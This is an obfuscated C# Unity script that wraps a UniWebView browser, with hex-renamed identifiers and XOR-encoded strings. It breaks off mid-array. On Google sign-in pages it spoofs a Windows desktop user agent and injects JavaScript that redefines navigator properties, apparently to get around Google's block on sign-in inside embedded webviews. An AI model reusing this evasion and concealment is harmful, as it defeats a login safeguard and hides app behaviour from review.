using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0x38c9f1f2 : MonoBehaviour
{
    private bool _0xe01a4881()
    {
        if (_0x4d934166())
            return true;
        if (_0x5ddc0b99 != null && _0x5ddc0b99.CanGoBack)
        {
            WLog(_0x6bb1939a._0x92fa81ce(new byte[36] { 198, 239, 252, 234, 249, 239, 252, 235, 174, 236, 239, 237, 229, 174, 163, 176, 174, 227, 239, 231, 224, 174, 217, 235, 236, 216, 231, 235, 249, 174, 201, 225, 204, 239, 237, 229 }, 142));
            _0x5ddc0b99.GoBack();
            return true;
        }

        return false;
    }

    private string _0xc8563b2e = "";
    private void _0xcc0a0c33()
    {
        _0x82d22cf4 = true;
        if (_0x5ddc0b99 != null)
            _0x5ddc0b99.SetUserAgent(_0x32227e8a());
    }

    internal void Update()
    {
        if (_0x5ddc0b99 == null)
            return;
        if (_0x0e58127c())
            _0x3b9d4e97();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0xcea5638c();
        if (_0x33a49c0c && _0x9997d60b != null)
            _0x9997d60b.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private bool _0x82d22cf4 = false;
    private string _0xb4c3b0f4 = "";
    private int _0x0da4a74b = -1;
    private bool _0x23aa8dcc = false;
    private void _0xffd250db()
    {
        if (_0x009ae614 != null)
            return;
        var _0xfa244db1 = _0xee768ccc();
        _0x009ae614 = new GameObject(_0x6bb1939a._0x92fa81ce(new byte[14] { 237, 223, 216, 236, 211, 223, 205, 233, 202, 211, 212, 212, 223, 200 }, 186), typeof(RectTransform), typeof(Text));
        _0x9997d60b = _0x009ae614.GetComponent<RectTransform>();
        _0x9997d60b.SetParent(_0xfa244db1.transform, false);
        _0x9997d60b.anchorMin = new Vector2(0.5f, 0.5f);
        _0x9997d60b.anchorMax = new Vector2(0.5f, 0.5f);
        _0x9997d60b.pivot = new Vector2(0.5f, 0.5f);
        _0x9997d60b.sizeDelta = new Vector2(600f, 600f);
        _0x9997d60b.anchoredPosition = Vector2.zero;
        _0x5e88e5d6 = _0x009ae614.GetComponent<Text>();
        _0x5e88e5d6.text = _0x6bb1939a._0x92fa81ce(new byte[1] { 176 }, 159);
        _0x5e88e5d6.font = Resources.GetBuiltinResource<Font>(_0x6bb1939a._0x92fa81ce(new byte[17] { 86, 127, 125, 123, 121, 99, 72, 111, 116, 110, 115, 119, 127, 52, 110, 110, 124 }, 26));
        _0x5e88e5d6.fontSize = 200;
        _0x5e88e5d6.alignment = TextAnchor.MiddleCenter;
        _0x5e88e5d6.color = Color.white;
        _0x5e88e5d6.raycastTarget = false;
        _0x009ae614.SetActive(false);
    }

    private string _0xa3df0380 = "";
    internal Vector2 lastSize = Vector2.zero;
    private void OnApplicationPause(bool _0xfdb2187f)
    {
        isApplicationPause = _0xfdb2187f;
    }

    private static string ReadPushField(Dictionary<string, object> _0x91e2a395, string _0x395ef0b2)
    {
        if (_0x91e2a395 == null || string.IsNullOrEmpty(_0x395ef0b2))
            return string.Empty;
        if (_0x91e2a395.TryGetValue(_0x6bb1939a._0x92fa81ce(new byte[16] { 234, 235, 240, 237, 226, 237, 231, 229, 240, 237, 235, 234, 192, 229, 240, 229 }, 132), out var raw))
        {
            try
            {
                var _0x798d556e = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0x798d556e != null && _0x798d556e.TryGetValue(_0x395ef0b2, out var nestedVal))
                {
                    var _0x0090ca85 = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0x0090ca85))
                        return _0x0090ca85;
                }
            }
            catch
            {
            }
        }

        if (_0x91e2a395.TryGetValue(_0x395ef0b2, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private string _0x1aadce68 = "";
    internal Button _0x8fe209ca(string _0xe330f742, Transform _0xf49c51db)
    {
        var _0x2a79ca43 = new GameObject(_0xe330f742 + _0x6bb1939a._0x92fa81ce(new byte[3] { 214, 224, 250 }, 148), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0x82bf41e3 = _0x2a79ca43.GetComponent<RectTransform>();
        _0x82bf41e3.SetParent(_0xf49c51db, false);
        var _0x044e4be9 = _0x2a79ca43.GetComponent<Image>();
        _0x044e4be9.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0xa34cf9f1 = _0x2a79ca43.GetComponent<Button>();
        var _0xab9fbc7c = _0xa34cf9f1.colors;
        _0xab9fbc7c.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0xab9fbc7c.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0xa34cf9f1.colors = _0xab9fbc7c;
        var _0x8a265f77 = new GameObject(_0x6bb1939a._0x92fa81ce(new byte[4] { 121, 72, 85, 89 }, 45), typeof(RectTransform), typeof(Text));
        var _0x006b7a11 = _0x8a265f77.GetComponent<RectTransform>();
        _0x006b7a11.SetParent(_0x2a79ca43.transform, false);
        _0x006b7a11.anchorMin = Vector2.zero;
        _0x006b7a11.anchorMax = Vector2.one;
        _0x006b7a11.offsetMin = _0x006b7a11.offsetMax = Vector2.zero;
        var _0x6893f2e8 = _0x8a265f77.GetComponent<Text>();
        _0x6893f2e8.text = _0xe330f742;
        _0x6893f2e8.alignment = TextAnchor.MiddleCenter;
        _0x6893f2e8.color = Color.black;
        _0x6893f2e8.font = Resources.GetBuiltinResource<Font>(_0x6bb1939a._0x92fa81ce(new byte[9] { 132, 183, 172, 164, 169, 235, 177, 177, 163 }, 197));
        _0x6893f2e8.fontSize = 28;
        WLog(_0x6bb1939a._0x92fa81ce(new byte[14] { 102, 87, 64, 68, 81, 64, 103, 80, 81, 81, 74, 75, 5, 2 }, 37) + _0xe330f742 + _0x6bb1939a._0x92fa81ce(new byte[1] { 35 }, 4));
        return _0xa34cf9f1;
    }

    private string _0xce136746 = "";
    private bool _0x4d934166()
    {
        var _0x86724288 = _0x2aa6d430();
        if (_0x86724288 == null)
            return false;
        WLog(_0x6bb1939a._0x92fa81ce(new byte[31] { 89, 112, 99, 117, 102, 112, 99, 116, 49, 115, 112, 114, 122, 49, 60, 47, 49, 97, 126, 97, 100, 97, 49, 86, 126, 83, 112, 114, 122, 43, 49 }, 17) + _0x86724288.Id);
        _0x86724288.GoBack();
        return true;
    }

    private string _0x64e8d81b()
    {
        float _0x0f4c7cab = Time.realtimeSinceStartup;
        if (_0x0f4c7cab < 0f)
            _0x0f4c7cab = 0f;
        int _0x3aa52343 = (int)(_0x0f4c7cab * 1000f);
        int _0xb2a368c0 = _0x3aa52343 / 60000;
        int _0x698f8bc4 = (_0x3aa52343 / 1000) % 60;
        int _0x3ceb5a2f = _0x3aa52343 % 1000;
        return string.Format(_0x6bb1939a._0x92fa81ce(new byte[21] { 220, 151, 157, 151, 151, 218, 157, 220, 150, 157, 151, 151, 218, 157, 220, 149, 157, 151, 151, 151, 218 }, 167), _0xb2a368c0, _0x698f8bc4, _0x3ceb5a2f);
    }

    private void _0xae8cbb13(UniWebView _0x13d599d8)
    {
        if (_0x23aa8dcc)
            return;
        _0x23aa8dcc = true;
        _0x13d599d8.AddUrlScheme(_0x6bb1939a._0x92fa81ce(new byte[2] { 3, 16 }, 119));
        _0x13d599d8.AddUrlScheme(_0x6bb1939a._0x92fa81ce(new byte[6] { 182, 177, 171, 186, 177, 171 }, 223));
        _0x13d599d8.AddUrlScheme(_0x6bb1939a._0x92fa81ce(new byte[6] { 160, 172, 191, 166, 168, 185 }, 205));
        _0x13d599d8.OnMessageReceived += (_0xb94dd54e, _0x345bfb1e) =>
        {
            if (TryOpenExternalLikeChrome(_0x345bfb1e.RawMessage))
            {
                _0x32477d12(false);
                return;
            }
        };
        _0x13d599d8.RegisterShouldHandleRequest(_0x8d3d4b8f =>
        {
            string _0xba818c2e = _0x8d3d4b8f != null ? _0x8d3d4b8f.Url : string.Empty;
            if (string.IsNullOrEmpty(_0xba818c2e))
                return true;
            WLog(_0x6bb1939a._0x92fa81ce(new byte[21] { 65, 122, 125, 103, 126, 118, 90, 115, 124, 118, 126, 119, 64, 119, 99, 103, 119, 97, 102, 40, 50 }, 18) + _0xba818c2e);
            if (TryOpenExternalLikeChrome(_0xba818c2e))
            {
                _0x32477d12(false);
                return false;
            }

            if (_0x8d3d4b8f != null && _0x8d3d4b8f.IsMainFrame && IsGoogleAuthFlowUrl(_0xba818c2e) && !_0x82d22cf4)
            {
                WLog(_0x6bb1939a._0x92fa81ce(new byte[62] { 122, 86, 94, 89, 23, 96, 82, 85, 97, 94, 82, 64, 23, 83, 82, 67, 82, 84, 67, 82, 83, 23, 112, 88, 88, 80, 91, 82, 23, 86, 66, 67, 95, 23, 98, 101, 123, 23, 26, 9, 23, 69, 82, 91, 88, 86, 83, 23, 64, 94, 67, 95, 23, 112, 88, 88, 80, 91, 82, 23, 98, 118 }, 55));
                _0x82d22cf4 = true;
                _0x32477d12(true);
                _0x5ddc0b99.SetUserAgent(_0x32227e8a());
                _0x5ddc0b99.Load(_0xba818c2e);
                return false;
            }

            return true;
        });
        _0x13d599d8.OnLoadingErrorReceived += (_0xb94dd54e, _0xa33545fd, _0x345bfb1e, _0x2521f0ef) =>
        {
            WLog(_0x6bb1939a._0x92fa81ce(new byte[25] { 186, 150, 158, 153, 215, 160, 146, 149, 161, 158, 146, 128, 215, 178, 133, 133, 152, 133, 205, 215, 148, 152, 147, 146, 202 }, 247) + _0xa33545fd + _0x6bb1939a._0x92fa81ce(new byte[9] { 200, 133, 141, 155, 155, 137, 143, 141, 213 }, 232) + _0x345bfb1e);
            string _0xcb7509e9 = GetFailingUrl(_0x2521f0ef);
            if (string.IsNullOrEmpty(_0xcb7509e9) || IsAboutBlank(_0xcb7509e9))
                return;
            _ = _0xdb8e0176(_0x6bb1939a._0x92fa81ce(new byte[8] { 174, 175, 134, 188, 171, 171, 182, 171 }, 217));
            WLog(_0x6bb1939a._0x92fa81ce(new byte[45] { 119, 91, 83, 84, 26, 109, 95, 88, 108, 83, 95, 77, 26, 92, 91, 83, 86, 83, 84, 93, 26, 111, 104, 118, 26, 23, 4, 26, 85, 74, 95, 84, 26, 95, 66, 78, 95, 72, 84, 91, 86, 86, 67, 0, 26 }, 58) + _0xcb7509e9);
            StopCurrentFailedLoad(_0xb94dd54e);
            _0x48f4a47c(_0xcb7509e9);
        };
        _0x13d599d8.OnPageStarted += (_0xb94dd54e, _0xbdcd7ed1) =>
        {
            _0x56bfde11 = 0;
            if (_0xba90566a && IsAboutBlank(_0xbdcd7ed1))
            {
                WLog(_0x6bb1939a._0x92fa81ce(new byte[27] { 119, 85, 66, 80, 70, 85, 74, 7, 70, 69, 72, 82, 83, 29, 69, 75, 70, 73, 76, 7, 84, 83, 70, 85, 83, 66, 67 }, 39));
                return;
            }

            WLog(_0x6bb1939a._0x92fa81ce(new byte[29] { 22, 58, 50, 53, 123, 12, 62, 57, 13, 50, 62, 44, 123, 20, 53, 11, 58, 60, 62, 8, 47, 58, 41, 47, 62, 63, 97, 123, 112 }, 91) + (Time.realtimeSinceStartup - _0xcd3046c7).ToString(_0x6bb1939a._0x92fa81ce(new byte[5] { 160, 190, 160, 160, 160 }, 144)) + _0x6bb1939a._0x92fa81ce(new byte[2] { 227, 176 }, 144) + _0xbdcd7ed1);
            if (TryOpenExternalLikeChrome(_0xbdcd7ed1))
            {
                StopCurrentFailedLoad(_0xb94dd54e);
                return;
            }

            if (ContainsIgnoreCase(_0xbdcd7ed1, _0x6bb1939a._0x92fa81ce(new byte[8] { 184, 181, 181, 189, 242, 189, 172, 172 }, 220)) || ContainsIgnoreCase(_0xbdcd7ed1, _0x6bb1939a._0x92fa81ce(new byte[15] { 155, 138, 146, 197, 156, 130, 143, 140, 142, 159, 197, 137, 135, 132, 140 }, 235)) || _0xbdcd7ed1.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[25] { 174, 178, 178, 182, 181, 252, 233, 233, 164, 182, 161, 170, 169, 164, 167, 170, 160, 167, 176, 232, 170, 175, 176, 163, 233 }, 198), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0xb94dd54e);
                OpenUrlExternally(_0xbdcd7ed1);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0xbdcd7ed1))
            {
                _0x32477d12(true);
                WLog(_0x6bb1939a._0x92fa81ce(new byte[41] { 115, 91, 91, 83, 88, 81, 20, 85, 65, 64, 92, 20, 82, 88, 91, 67, 20, 80, 81, 64, 81, 87, 64, 81, 80, 20, 25, 10, 20, 95, 81, 81, 68, 20, 66, 93, 71, 93, 86, 88, 81 }, 52));
                return;
            }

            _0x119d7677 = true;
            _0x32477d12(true);
            WLog(_0x6bb1939a._0x92fa81ce(new byte[43] { 244, 198, 193, 245, 202, 198, 212, 131, 207, 204, 194, 199, 202, 205, 196, 140, 209, 198, 199, 202, 209, 198, 192, 215, 202, 205, 196, 131, 142, 157, 131, 200, 198, 198, 211, 131, 213, 202, 208, 202, 193, 207, 198 }, 163));
        };
        _0x13d599d8.OnPageCommitted += (_0xb94dd54e, _0xbdcd7ed1) =>
        {
            if (_0xba90566a && IsAboutBlank(_0xbdcd7ed1))
                return;
            WLog(_0x6bb1939a._0x92fa81ce(new byte[31] { 232, 196, 204, 203, 133, 242, 192, 199, 243, 204, 192, 210, 133, 234, 203, 245, 196, 194, 192, 230, 202, 200, 200, 204, 209, 209, 192, 193, 159, 133, 142 }, 165) + (Time.realtimeSinceStartup - _0xcd3046c7).ToString(_0x6bb1939a._0x92fa81ce(new byte[5] { 141, 147, 141, 141, 141 }, 189)) + _0x6bb1939a._0x92fa81ce(new byte[2] { 163, 240 }, 208) + _0xbdcd7ed1);
            if (!firstLoadShown && IsHttpUrl(_0xbdcd7ed1))
            {
                firstLoadShown = true;
                _0x119d7677 = false;
                _0x32477d12(false);
                _0x8a3a47a4();
                _0xcea5638c();
                _0xb94dd54e.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xdb8e0176(_0x6bb1939a._0x92fa81ce(new byte[9] { 55, 54, 31, 47, 48, 37, 46, 37, 36 }, 64));
                WLog(_0x6bb1939a._0x92fa81ce(new byte[39] { 157, 177, 185, 190, 240, 135, 181, 178, 134, 185, 181, 167, 240, 163, 184, 191, 167, 190, 240, 191, 190, 240, 179, 191, 189, 189, 185, 164, 164, 181, 180, 240, 179, 191, 190, 164, 181, 190, 164 }, 208));
            }
        };
        _0x13d599d8.OnPageProgressChanged += (_0xb94dd54e, _0xc2b5263c) =>
        {
            if (_0xba90566a)
                return;
            if (!firstLoadShown && _0xc2b5263c >= 0.65f)
            {
                firstLoadShown = true;
                _0x119d7677 = false;
                _0x32477d12(false);
                _0x8a3a47a4();
                _0xcea5638c();
                _0xb94dd54e.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xdb8e0176(_0x6bb1939a._0x92fa81ce(new byte[9] { 11, 10, 35, 19, 12, 25, 18, 25, 24 }, 124));
                WLog(_0x6bb1939a._0x92fa81ce(new byte[32] { 69, 105, 97, 102, 40, 95, 109, 106, 94, 97, 109, 127, 40, 123, 96, 103, 127, 102, 40, 106, 113, 40, 120, 122, 103, 111, 122, 109, 123, 123, 50, 40 }, 8) + _0xc2b5263c);
            }
        };
        _0x13d599d8.OnPageFinished += (_0xb94dd54e, _0xa33545fd, _0xbdcd7ed1) =>
        {
            if (_0xba90566a && IsAboutBlank(_0xbdcd7ed1))
            {
                _0xba90566a = false;
                WLog(_0x6bb1939a._0x92fa81ce(new byte[28] { 116, 86, 65, 83, 69, 86, 73, 4, 69, 70, 75, 81, 80, 30, 70, 72, 69, 74, 79, 4, 66, 77, 74, 77, 87, 76, 65, 64 }, 36));
                return;
            }

            WLog(_0x6bb1939a._0x92fa81ce(new byte[24] { 102, 74, 66, 69, 11, 124, 78, 73, 125, 66, 78, 92, 11, 109, 66, 69, 66, 88, 67, 78, 79, 17, 11, 0 }, 43) + (Time.realtimeSinceStartup - _0xcd3046c7).ToString(_0x6bb1939a._0x92fa81ce(new byte[5] { 1, 31, 1, 1, 1 }, 49)) + _0x6bb1939a._0x92fa81ce(new byte[7] { 148, 199, 132, 136, 131, 130, 218 }, 231) + _0xa33545fd + _0x6bb1939a._0x92fa81ce(new byte[5] { 111, 58, 61, 35, 114 }, 79) + _0xbdcd7ed1);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x119d7677 = false;
                _0x32477d12(false);
                _0x8a3a47a4();
                _0xcea5638c();
                _0xb94dd54e.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xdb8e0176(_0x6bb1939a._0x92fa81ce(new byte[9] { 38, 39, 14, 62, 33, 52, 63, 52, 53 }, 81));
                WLog(_0x6bb1939a._0x92fa81ce(new byte[33] { 190, 146, 154, 157, 211, 164, 150, 145, 165, 154, 150, 132, 211, 149, 154, 129, 128, 135, 211, 159, 156, 146, 151, 211, 144, 156, 158, 131, 159, 150, 135, 150, 151 }, 243));
            }
            else if (_0x119d7677)
            {
                _0x119d7677 = false;
                _0x32477d12(false);
                _0xb94dd54e.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x6bb1939a._0x92fa81ce(new byte[40] { 198, 234, 226, 229, 171, 220, 238, 233, 221, 226, 238, 252, 171, 216, 227, 228, 252, 171, 234, 237, 255, 238, 249, 171, 231, 228, 234, 239, 226, 229, 236, 171, 237, 226, 229, 226, 248, 227, 238, 239 }, 139));
            }
            else
            {
                _0x32477d12(false);
            }

            if (_0x82d22cf4 && !IsGoogleAuthFlowUrl(_0xbdcd7ed1) && !IsGoogleAuthFlowUrl(_0xbdcd7ed1))
            {
                WLog(_0x6bb1939a._0x92fa81ce(new byte[48] { 14, 38, 38, 46, 37, 44, 105, 40, 60, 61, 33, 105, 58, 44, 44, 36, 58, 105, 47, 32, 39, 32, 58, 33, 44, 45, 105, 100, 119, 105, 59, 44, 58, 61, 38, 59, 44, 105, 45, 44, 47, 40, 60, 37, 61, 105, 28, 8 }, 73));
                _0x82d22cf4 = false;
                _0x5ddc0b99.SetUserAgent("");
            }
        };
        _0x13d599d8.OnShouldClose += _0xb94dd54e =>
        {
            WLog(_0x6bb1939a._0x92fa81ce(new byte[41] { 215, 216, 233, 255, 248, 209, 172, 193, 237, 229, 226, 172, 219, 233, 238, 218, 229, 233, 251, 172, 195, 226, 223, 228, 227, 249, 224, 232, 207, 224, 227, 255, 233, 172, 229, 226, 250, 227, 231, 233, 232 }, 140));
            _0x3b9d4e97();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0x13d599d8.SetPopupPageEventEnabled(true);
        bool _0x8d6920a5 = false;
        bool _0x72d7f76a = false;
        _0x13d599d8.OnMultipleWindowOpened += (_0xb94dd54e, _0x033f2b1d) =>
        {
            _0xb94dd54e.ScrollTo(0, 0, false);
            WLog(_0x6bb1939a._0x92fa81ce(new byte[43] { 78, 65, 112, 102, 97, 72, 53, 88, 116, 124, 123, 53, 66, 112, 119, 67, 124, 112, 98, 53, 88, 96, 121, 97, 124, 101, 121, 112, 66, 124, 123, 113, 122, 98, 53, 90, 101, 112, 123, 112, 113, 47, 53 }, 21) + _0x033f2b1d);
            var _0x1bf6f170 = _0x13d599d8.GetPopupWindow(_0x033f2b1d);
            if (_0x1bf6f170 == null)
                return;
            _0x8651a4d4.Add(_0x1bf6f170);
            Debug.Log($"[Test] Popup ID: {_0x1bf6f170.Id}");
            _0x1bf6f170.OnPageStarted += (_0x246ced14, _0xbdcd7ed1) =>
            {
                WLog(_0x6bb1939a._0x92fa81ce(new byte[36] { 224, 239, 222, 200, 207, 230, 155, 235, 212, 203, 206, 203, 155, 236, 222, 217, 237, 210, 222, 204, 155, 244, 213, 235, 218, 220, 222, 232, 207, 218, 201, 207, 222, 223, 129, 155 }, 187) + _0xbdcd7ed1);
                _0x56bfde11 = 0;
                if (string.IsNullOrEmpty(_0xbdcd7ed1) || IsAboutBlank(_0xbdcd7ed1))
                    return;
                if (IsGoogleAuthFlowUrl(_0xbdcd7ed1))
                {
                    WLog(_0x6bb1939a._0x92fa81ce(new byte[57] { 18, 29, 44, 58, 61, 20, 105, 25, 38, 57, 60, 57, 105, 14, 38, 38, 46, 37, 44, 105, 40, 60, 61, 33, 105, 47, 37, 38, 62, 105, 100, 119, 105, 58, 57, 38, 38, 47, 105, 14, 38, 38, 46, 37, 44, 105, 10, 33, 59, 38, 36, 44, 105, 28, 8, 115, 105 }, 73) + _0xbdcd7ed1);
                    _0x8d6920a5 = false;
                    _0xcc0a0c33();
                    if (_0x246ced14 != null && _0x246ced14.IsAlive)
                        _0x246ced14.EvaluateJavaScript(_0x0d753826());
                    return;
                }

                if (_0x5ddc0b99 == null)
                    return;
                if (!_0x8d6920a5)
                {
                    _0x8d6920a5 = true;
                    _0x5ddc0b99.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x6bb1939a._0x92fa81ce(new byte[39] { 142, 129, 176, 166, 161, 136, 245, 133, 186, 165, 160, 165, 245, 180, 165, 165, 185, 172, 245, 130, 188, 187, 177, 186, 162, 166, 245, 177, 176, 166, 190, 161, 186, 165, 245, 128, 148, 239, 245 }, 213) + _0xbdcd7ed1);
                }

                if (_0x246ced14 != null && _0x246ced14.IsAlive)
                    _0x246ced14.EvaluateJavaScript(_0xcd145da4());
                if (!_0x72d7f76a && _0x246ced14 != null && _0x246ced14.IsAlive && IsHttpUrl(_0xbdcd7ed1))
                {
                    _0x72d7f76a = true;
                }
            };
            _0x1bf6f170.OnPageFinished += (_0x246ced14, _0x2521f0ef) =>
            {
                string _0xe10d81bd = _0x2521f0ef != null ? _0x2521f0ef.data : string.Empty;
                WLog(_0x6bb1939a._0x92fa81ce(new byte[35] { 178, 189, 140, 154, 157, 180, 201, 185, 134, 153, 156, 153, 201, 190, 140, 139, 191, 128, 140, 158, 201, 175, 128, 135, 128, 154, 129, 140, 141, 211, 201, 156, 155, 133, 212 }, 233) + _0xe10d81bd);
                if (_0x246ced14 == null || !_0x246ced14.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0xe10d81bd))
                {
                    _0xcc0a0c33();
                    _0x246ced14.EvaluateJavaScript(_0x0d753826());
                    return;
                }

                if (!_0x8d6920a5)
                    return;
                _0x246ced14.EvaluateJavaScript(_0xcd145da4());
            };
        };
        _0x13d599d8.OnMultipleWindowClosed += (_0xb94dd54e, _0x033f2b1d) =>
        {
            _0x8651a4d4.RemoveAll(_0xf0ec1f95 => _0xf0ec1f95 == null || _0xf0ec1f95.Id == _0x033f2b1d || !_0xf0ec1f95.IsAlive);
            _0x32477d12(false);
            if (_0x8651a4d4.Count == 0 && _0x5ddc0b99 != null)
            {
                _0x8d6920a5 = false;
                _0x72d7f76a = false;
                _0x3175c2ce();
            }

            WLog(_0x6bb1939a._0x92fa81ce(new byte[43] { 207, 192, 241, 231, 224, 201, 180, 217, 245, 253, 250, 180, 195, 241, 246, 194, 253, 241, 227, 180, 217, 225, 248, 224, 253, 228, 248, 241, 195, 253, 250, 240, 251, 227, 180, 215, 248, 251, 231, 241, 240, 174, 180 }, 148) + _0x033f2b1d);
        };
        _0x13d599d8.RegisterOnRequestMediaCapturePermission(_0x8d3d4b8f =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private string _0x37770fa6 = "";
    private static bool IsPrivacyItemTrue(Item _0x43255f25)
    {
        if (_0x43255f25.Key != _0x6bb1939a._0x92fa81ce(new byte[9] { 47, 53, 22, 52, 47, 48, 39, 37, 63 }, 70))
            return false;
        try
        {
            var _0xfe2a37a0 = _0x43255f25.Value.GetAs<object>();
            return _0xfe2a37a0 switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private readonly List<UniWebViewPopup> _0x8651a4d4 = new List<UniWebViewPopup>();
    internal Rect lastSafe = Rect.zero;
    private string GetFailingUrl(UniWebViewNativeResultPayload _0x5af8ce36)
    {
        if (_0x5af8ce36 == null || _0x5af8ce36.Extra == null)
            return null;
        object _0x6110bd0f;
        if (!_0x5af8ce36.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0x6110bd0f))
            return null;
        return _0x6110bd0f as string;
    }

    private string _0xcd145da4()
    {
        return _0x6bb1939a._0x92fa81ce(new byte[12] { 45, 99, 112, 107, 102, 113, 108, 106, 107, 45, 44, 126 }, 5) + _0x6bb1939a._0x92fa81ce(new byte[8] { 30, 9, 26, 72, 29, 9, 85, 79 }, 104) + WindowsDesktopUserAgent + _0x6bb1939a._0x92fa81ce(new byte[2] { 120, 100 }, 95) + _0x6bb1939a._0x92fa81ce(new byte[30] { 121, 110, 125, 47, 127, 125, 96, 123, 96, 50, 65, 110, 121, 102, 104, 110, 123, 96, 125, 33, 127, 125, 96, 123, 96, 123, 118, 127, 106, 52 }, 15) + _0x6bb1939a._0x92fa81ce(new byte[121] { 239, 252, 231, 234, 253, 224, 230, 231, 169, 237, 236, 239, 161, 230, 235, 227, 165, 226, 236, 240, 165, 255, 232, 229, 160, 242, 253, 251, 240, 242, 198, 235, 227, 236, 234, 253, 167, 237, 236, 239, 224, 231, 236, 217, 251, 230, 249, 236, 251, 253, 240, 161, 230, 235, 227, 165, 226, 236, 240, 165, 242, 238, 236, 253, 179, 239, 252, 231, 234, 253, 224, 230, 231, 161, 160, 242, 251, 236, 253, 252, 251, 231, 169, 255, 232, 229, 178, 244, 165, 234, 230, 231, 239, 224, 238, 252, 251, 232, 235, 229, 236, 179, 253, 251, 252, 236, 244, 160, 178, 244, 234, 232, 253, 234, 225, 161, 236, 160, 242, 244, 244 }, 137) + _0x6bb1939a._0x92fa81ce(new byte[26] { 194, 195, 192, 142, 214, 212, 201, 210, 201, 138, 129, 211, 213, 195, 212, 231, 193, 195, 200, 210, 129, 138, 211, 199, 143, 157 }, 166) + _0x6bb1939a._0x92fa81ce(new byte[130] { 195, 194, 193, 143, 215, 213, 200, 211, 200, 139, 128, 198, 215, 215, 241, 194, 213, 212, 206, 200, 201, 128, 139, 128, 146, 137, 151, 135, 143, 240, 206, 201, 195, 200, 208, 212, 135, 233, 243, 135, 150, 151, 137, 151, 156, 135, 240, 206, 201, 145, 147, 156, 135, 223, 145, 147, 142, 135, 230, 215, 215, 203, 194, 240, 194, 197, 236, 206, 211, 136, 146, 148, 144, 137, 148, 145, 135, 143, 236, 239, 243, 234, 235, 139, 135, 203, 206, 204, 194, 135, 224, 194, 196, 204, 200, 142, 135, 228, 207, 213, 200, 202, 194, 136, 150, 149, 151, 137, 151, 137, 151, 137, 151, 135, 244, 198, 193, 198, 213, 206, 136, 146, 148, 144, 137, 148, 145, 128, 142, 156 }, 167) + _0x6bb1939a._0x92fa81ce(new byte[30] { 2, 3, 0, 78, 22, 20, 9, 18, 9, 74, 65, 22, 10, 7, 18, 0, 9, 20, 11, 65, 74, 65, 49, 15, 8, 85, 84, 65, 79, 93 }, 102) + _0x6bb1939a._0x92fa81ce(new byte[34] { 245, 244, 247, 185, 225, 227, 254, 229, 254, 189, 182, 231, 244, 255, 245, 254, 227, 182, 189, 182, 214, 254, 254, 246, 253, 244, 177, 216, 255, 242, 191, 182, 184, 170 }, 145) + _0x6bb1939a._0x92fa81ce(new byte[30] { 228, 229, 230, 168, 240, 242, 239, 244, 239, 172, 167, 237, 225, 248, 212, 239, 245, 227, 232, 208, 239, 233, 238, 244, 243, 167, 172, 176, 169, 187 }, 128) + _0x6bb1939a._0x92fa81ce(new byte[449] { 42, 44, 39, 37, 40, 63, 44, 126, 43, 63, 58, 99, 37, 60, 44, 63, 48, 58, 45, 100, 5, 37, 60, 44, 63, 48, 58, 100, 121, 29, 54, 44, 49, 51, 55, 43, 51, 121, 114, 40, 59, 44, 45, 55, 49, 48, 100, 121, 111, 108, 110, 121, 35, 114, 37, 60, 44, 63, 48, 58, 100, 121, 25, 49, 49, 57, 50, 59, 126, 29, 54, 44, 49, 51, 59, 121, 114, 40, 59, 44, 45, 55, 49, 48, 100, 121, 111, 108, 110, 121, 35, 114, 37, 60, 44, 63, 48, 58, 100, 121, 16, 49, 42, 99, 31, 97, 28, 44, 63, 48, 58, 121, 114, 40, 59, 44, 45, 55, 49, 48, 100, 121, 108, 106, 121, 35, 3, 114, 51, 49, 60, 55, 50, 59, 100, 56, 63, 50, 45, 59, 114, 46, 50, 63, 42, 56, 49, 44, 51, 100, 121, 9, 55, 48, 58, 49, 41, 45, 121, 114, 57, 59, 42, 22, 55, 57, 54, 27, 48, 42, 44, 49, 46, 39, 8, 63, 50, 43, 59, 45, 100, 56, 43, 48, 61, 42, 55, 49, 48, 118, 119, 37, 44, 59, 42, 43, 44, 48, 126, 14, 44, 49, 51, 55, 45, 59, 112, 44, 59, 45, 49, 50, 40, 59, 118, 37, 63, 44, 61, 54, 55, 42, 59, 61, 42, 43, 44, 59, 100, 121, 38, 102, 104, 121, 114, 60, 55, 42, 48, 59, 45, 45, 